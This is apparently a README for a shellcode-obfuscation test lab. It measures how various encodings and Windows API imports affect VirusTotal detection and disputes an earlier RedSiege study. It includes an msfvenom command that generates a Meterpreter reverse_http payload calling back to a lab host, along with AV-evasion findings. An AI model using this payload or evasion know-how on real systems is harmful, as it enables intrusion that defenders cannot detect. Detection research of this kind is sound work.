# SOL ShellcodeObfuscationLab

Shellcode obfuscations laboratory based on RedSiege [Chromatophore](https://github.com/RedSiege/Chromatophore/). 


## Background

I see RedTeam research like [Adventures in Shellcode Obfuscation!](https://redsiege.com/blog/2024/09/adventures-in-shellcode-obfuscation-part-14-further-research/), a 
[14 part series](https://redsiege.com/adventures-in-shellcode-obfuscation/)
of hiding shellcode using various different encryption- or encoding ciphers. 

In the security scene, the myth perpetuates: How you encode a shellcode has an
influence on the detection rate. The assumption is, that somehow an AV or security software
has a unique ability to automagically reverse engineer encryption ciphers, and also
have a quantum computer integrated to crack the key. 

The truth is: AV doesnt know shit. 

RedSiege came to the following wrong result:

| Technique          | VT Score |
| ------------------ | -------- |
| XOR Multibyte Key  | 2        |
| Offsets            | 2        |
| Jargon             | 3        |
| Reverse Byte Order | 4        |
| Jigsaw             | 4        |
| Reversed Byte XOR  | 5        |
| IPv4               | 6        |
| MAC Address        | 6        |
| Caesar             | 7        |
| RC4                | 7        |
| XOR                | 8        |
| AES                | 8        |
| Two Array          | 8        |
| Reverse String     | 13       |
| UUID               | 13       |
| Base64             | 18       |
| No Obfuscation     | 27       |


But didnt attempt to question the data. There are some issues with it: 

* Why are the top three Base64, UUID, and reverse hex string? Especially the later is very obscure
* No negative test (without malicious shellcode)
* Some programs are written in C, some in C#
* Some use WinAPI (AES, RC4, UUID) which are either an IOC, or may block AV emulator
* ReverseXor brute forces the key
* In jargon.c they mention that Defender detects the decryption routine itself. Same in xor_multibyte
* As they store the shellcode in a variable, static analysis tools can try out their deobfuscation on all the variables (explains high detection of ReverseString and Base64)
* Scans performed with large intervals between them (weeks?)

Which means that the test has been performed wrong, and the results are invalid, 
and conclusions based on the data are misleading. 

Luckily RedSiege published the [shellcode encoder sources](https://github.com/RedSiege/Chromatophore).
I made this framework based on it to test it for myself. 


## Predictions

* Which encryption you use doesnt matter - they all equally resistant to analysis
* Using windows API's will increase detection rate


## Results

Tests have been performed with either "random" - a alphanumeric 20 byte string as "shellcode". And "metasploit" 
with output of `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o beacon.bin`. 
The "metasploit" does not execute the shellcode, only decodes and prints it. 

Conclusion: 
* The type of encoding/encryption doesnt matter
* More important is if a windows API is being used/imported (static analysis, e.g. IAT in PE)
* Note that the "NO-obfuscation" (plaintext) metasploit outperforms AES encryption, base64 windows api, ip-, mac- and uuid-encoding
* VirusTotal has maybe one memory scanner. The rest seem to be static analysis. 

| **What**           | **Library**           | **Includes**              | **Function / IAT**                 | **Random** | **Metasploit** |
| ------------------ | --------------------- | ------------------------- | ---------------------------------- | ---------- | -------------- |
| [aes](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/aes_work.c)                | crypt32.lib, advapi32 | wincrypt.h                | Crypt\*                            | **5**          | **6**              |
| [base64](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/base64_work.c)             | \-                    | \-                        | \-                                 | 3          | 3              |
| [base64api](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/base64api_work.c)          | crypt32.lib           | wincrypt.h                | CryptStringToBinaryA               | **5**          | **6**              |
| [bin2ip](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/bin2ip_work.c)             | Ntdll.lib             | ntstatus.h<br>Ip2string.h | RtlIpv4StringToAddressA            | **8**          | **10**             |
| [bin2mac](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/bin2mac_work.c)            | Ntdll.lib             | ntstatus.h<br>Ip2string.h | RtlEthernetStringToAddressA        | **8**          | **18**             |
| [caesar](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/caesar_work.c)              | \-                    | \-                        | \-                                 | 2          | 2              |
| [jargon](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/jargon_work.c)             | \-                    | \-                        | \-                                 | 3          | 2              |
| [jigsaw](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/jigsaw_work.c)             | \-                    | \-                        | \-                                 | 2          | 3              |
| [offset](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/offset_work.c)             | \-                    | \-                        | \-                                 | 2          | 3              |
| [rc4api](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/rc4api_work.c)             | \-                    | \-                        | GetProcAddress (SystemFunction033) | 2          | 2              |
| [reverse_byte_order](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/reverse_byte_order_work.c) | \-                    | \-                        | \-                                 | 2          | 2              |
| [reverse_hex_string](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/reverse_hex_string_work.c) | \-                    | \-                        | \-                                 | 2          | 2              |
| [twoarray](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/twoarray_work.c)           | \-                    | \-                        | \-                                 | 2          | 3              |
| [uuidapi](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/uuidapi_work.c)            | rpcrt4.lib            | rpc.h                     | UuidFromStringA                    | **8**          | **11**             |
| [xor_multibyte](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/xor_multibyte_work.c)      | \-                    | \-                        | \-                                 | 1          | 2              |
| [xor_reverse](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/xor_reverse_work.c)        | \-                    | \-                        | \-                                 | 2          | 3              |
| [xor_single](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/xor_single_work.c)         | \-                    | \-                        | \-                                 | 1          | 3              |
| [**NO OBFUSCATION**](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/noobfuscation_work.c)     | \-                    | \-                        | \-                                 | 2          | 3              |


The results of the test are at [lab_results/](https://github.com/dobin/ShellcodeObfuscationLab/tree/main/lab_results). 
For example the generated [aes.c source code](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/aes_work.c),
and its [VirusTotal result](https://github.com/dobin/ShellcodeObfuscationLab/blob/main/lab_results/metasploit/aes.exe.json).


## SOL Usage

Use the `x64 native tools command prompt` from Visual Studio so you have access to `ml.exe` and `Windows.h`. 

To compile all the source from `chromatophore/` into `output/*.exe`:
```
> python.exe sol.py compile
```

To send all the exes to VirusTotal:

```
> set VT_API_KEY=123...
> python.exe sol.py vt
```

Output is in `output/*.exe.json` and `output/scan_results.txt`. 

